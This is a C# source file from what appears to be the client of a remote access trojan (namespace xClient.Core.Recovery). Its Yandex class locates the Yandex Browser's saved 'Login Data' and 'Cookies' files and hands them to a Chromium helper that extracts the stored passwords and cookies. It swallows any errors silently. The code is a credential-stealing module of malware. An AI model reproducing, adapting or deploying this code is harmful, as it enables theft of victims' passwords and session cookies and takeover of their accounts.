using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;

namespace xClient.Core.Recovery.Browsers;

public class Yandex
{
	public static List<RecoveredAccount> GetSavedPasswords()
	{
		try
		{
			return ChromiumBase.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Login Data"), "Yandex");
		}
		catch (Exception)
		{
			return new List<RecoveredAccount>();
		}
	}

	public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
	{
		try
		{
			return ChromiumBase.Cookies(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Cookies"), "Yandex");
		}
		catch (Exception)
		{
			return new List<ChromiumBase.ChromiumCookie>();
		}
	}
}
